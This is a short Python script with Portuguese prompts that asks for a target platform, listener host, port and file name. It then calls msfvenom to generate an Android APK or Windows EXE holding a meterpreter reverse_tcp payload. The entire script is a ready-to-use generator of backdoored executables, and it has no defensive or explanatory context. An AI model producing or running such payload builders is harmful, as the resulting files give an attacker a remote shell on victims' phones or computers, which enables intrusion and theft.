import os

exploit = str(input('Android/Windows[letras minusculas] : '))
lhost = str(input('Lhost : '))
lport = int(input('Lport : '))
nome = str(input('Nome do Exploit : '))
ext = str(input('Android[Apk]/Windows[Exe] Minusculo : '))

os.system('msfvenom -p {}/meterpreter/reverse_tcp lhost={} lport={} -R > {}.{}'.format(exploit,lhost,lport,nome,ext))